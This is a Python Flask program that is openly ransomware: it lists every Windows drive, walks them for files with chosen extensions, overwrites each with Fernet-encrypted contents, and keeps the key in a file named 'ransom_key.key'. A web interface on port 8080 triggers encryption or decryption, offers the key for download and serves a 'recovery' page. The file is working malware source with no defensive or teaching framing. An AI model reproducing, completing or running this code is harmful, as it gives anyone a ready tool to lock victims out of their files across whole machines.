import os
import platform
from cryptography.fernet import Fernet
from flask import Flask, request, render_template, send_file
import win32api
import win32con
import win32file
import time

app = Flask(__name__)
KEY_FILE = 'ransom_key.key'
TARGET_DISKS = []

# Manual extension list - modify this as needed
EXTENSIONS = ['.jpg', '.txt']

def get_disk_drives():
    """Get all available drives"""
    drives = []
    bitmask = win32api.GetLogicalDrives()
    for letter in range(65, 91):  # A-Z
        if bitmask & 1:
            drive = chr(letter) + ':'
            drives.append(drive)
        bitmask >>= 1
    return drives

def get_encrypted_files(drive_root):
    """Find files to encrypt on a drive"""
    files = []
    for dirpath, _, filenames in os.walk(drive_root):
        for filename in filenames:
            if any(filename.endswith(ext) for ext in EXTENSIONS):
                file_path = os.path.join(dirpath, filename)
                try:
                    with open(file_path, 'rb'):
                        files.append(file_path)
                except (PermissionError, OSError):
                    continue
    return files

def process_files(action):
    """Encrypt or decrypt files"""
    if not TARGET_DISKS:
        TARGET_DISKS.extend(get_disk_drives())
    
    file_count = 0
    for drive in TARGET_DISKS:
        if not os.path.exists(drive):
            continue
            
        files = get_encrypted_files(drive)
        file_count += len(files)
        
        if action == 'encrypt':
            if not os.path.exists(KEY_FILE):
                key = Fernet.generate_key()
                with open(KEY_FILE, 'wb') as key_file:
                    key_file.write(key)
            else:
                with open(KEY_FILE, 'rb') as key_file:
                    key = key_file.read()
            
            fernet = Fernet(key)
            
            for file in files:
                try:
                    with open(file, 'rb') as f:
                        contents = f.read()
                    
                    encrypted_contents = fernet.encrypt(contents)
                    with open(file, 'wb') as f:
                        f.write(encrypted_contents)
                except Exception:
                    continue
        
        elif action == 'decrypt':
            if not os.path.exists(KEY_FILE):
                return "No key found for decryption"
                
            with open(KEY_FILE, 'rb') as key_file:
                key = key_file.read()
            
            fernet = Fernet(key)
            
            for file in files:
                try:
                    with open(file, 'rb') as f:
                        encrypted_contents = f.read()
                    
                    decrypted_contents = fernet.decrypt(encrypted_contents)
                    with open(file, 'wb') as f:
                        f.write(decrypted_contents)
                except Exception:
                    continue
    
    return f"{file_count} files processed"

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/start', methods=['POST'])
def start_process():
    action = request.form.get('action')
    if action in ['encrypt', 'decrypt']:
        result = process_files(action)
        return f"<h2>{result}</h2><a href='/'>Back</a>"
    return "Invalid action!"

@app.route('/download-key')
def download_key():
    if os.path.exists(KEY_FILE):
        return send_file(KEY_FILE, as_attachment=True)
    return "Key not found"

@app.route('/recovery')
def recovery_page():
    return render_template('recovery.html')

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=8080, debug=False)